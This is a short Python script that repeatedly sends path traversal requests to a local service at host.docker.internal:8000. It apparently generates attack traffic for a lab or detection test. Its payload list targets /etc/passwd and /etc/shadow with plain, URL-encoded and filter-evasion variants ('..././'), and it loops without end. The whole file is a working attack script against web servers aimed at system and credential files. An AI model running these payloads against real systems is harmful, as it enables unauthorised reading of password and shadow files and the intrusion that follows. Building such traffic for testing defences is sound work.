import requests
import time
import random

TARGET = "http://host.docker.internal:8000"

PATHS = [
    "/etc/passwd",
    "../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..././..././etc/shadow"
]

def attack():
    while True:
        try:
            path = random.choice(PATHS)
            url = f"{TARGET}/{path}"
            response = requests.get(url)
            print(f"[Path] Sent to {url} | Status: {response.status_code}")
        except Exception as e:
            print(f"[Path Error] {e}")
        time.sleep(1)

if __name__ == "__main__":
    attack()